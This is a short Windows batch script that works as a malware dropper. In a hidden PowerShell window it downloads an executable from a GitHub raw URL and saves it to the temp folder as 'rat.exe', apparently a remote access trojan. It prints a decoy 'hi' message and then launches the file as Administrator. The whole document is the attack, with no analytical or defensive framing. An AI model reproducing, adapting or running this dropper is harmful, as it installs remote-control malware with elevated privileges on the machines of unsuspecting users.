@echo off

:: Hide PowerShell execution window while downloading the file
powershell -Command "Start-Process powershell -ArgumentList 'Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe -OutFile %TEMP%\rat.exe' -WindowStyle Hidden" 

:: Display "hi" message
echo hi

:: Run the downloaded file as administrator
start /B "" runas /user:Administrator "%TEMP%\rat.exe"

endlocal
